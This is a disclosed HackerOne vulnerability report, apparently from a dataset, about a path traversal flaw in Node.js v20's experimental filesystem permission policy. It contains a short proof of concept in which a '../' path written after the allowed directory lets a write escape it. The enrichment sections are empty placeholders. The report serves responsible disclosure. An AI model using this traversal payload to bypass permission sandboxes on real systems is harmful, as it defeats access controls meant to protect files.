---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1952978'
original_report_id: '1952978'
title: Filesystem experimental permissions policy does not handle path traversal cases.
weakness: Path Traversal
team_handle: nodejs
created_at: '2023-04-18T18:34:13.103Z'
disclosed_at: '2023-07-20T20:57:35.392Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# Filesystem experimental permissions policy does not handle path traversal cases.

## Metadata

- HackerOne Report ID: 1952978
- Weakness: Path Traversal
- Program: nodejs
- Disclosed At: 2023-07-20T20:57:35.392Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Consider the following command on Node v20.0.0:
```
node --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js
```
This command is intended to restrict write access to only files present in the directory /home/kali/restricted

However if we have the following poc.js:
```
const fs = module.require('fs')
fs.writeFileSync("/home/kali/restricted/../secret.txt", "Target Overwritten!")
```
This apparently matches the directory /home/kali/restricted/ directory check and then writes to /home/kali/secret.txt (by using ../), which is not intended, bypassing the experimental permission policy for files.

## Impact

Path traversal when checking experimental file permission policy

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
